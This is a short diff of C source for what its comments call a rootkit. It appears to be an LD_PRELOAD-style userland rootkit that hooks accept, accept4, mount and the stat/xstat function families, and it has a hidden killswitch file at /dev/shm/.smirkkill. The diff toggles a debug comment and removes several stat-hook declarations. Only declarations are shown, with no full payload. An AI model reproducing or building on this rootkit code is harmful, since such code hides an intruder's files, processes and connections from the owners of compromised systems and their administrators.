@@ -21,7 +21,7 @@
 #include <sys/stat.h>
 
 // enable/disable debug 
-//#define DEBUG
+// #define DEBUG
 
 // killswitch file: if you create this file the rootkit will sadly uninstall :_(_
 #define KILLSWITCH "/dev/shm/.smirkkill"
@@ -59,12 +59,8 @@ int (*hooked_accept)(int, struct sockaddr_in *, socklen_t *);
 int (*hooked_accept4)(int, struct sockaddr_in *, socklen_t *, int);
 int (*hooked_mount)(const char *, const char *, const char *, unsigned long, const void *);
 
-int (*hooked_stat)(const char *, struct stat *);
 int (*hooked_xstat)(int version, const char *, struct stat *);
-int (*hooked_stat64)(const char *, struct stat64 *);
 int (*hooked_xstat64)(int version, const char *, struct stat64 *);
 
-int (*hooked_lstat)(const char *, struct stat *);
 int (*hooked_lxstat)(int version, const char *, struct stat *);
-int (*hooked_lstat64)(const char *, struct stat *);
 int (*hooked_lxstat64)(int version, const char *, struct stat64 *);
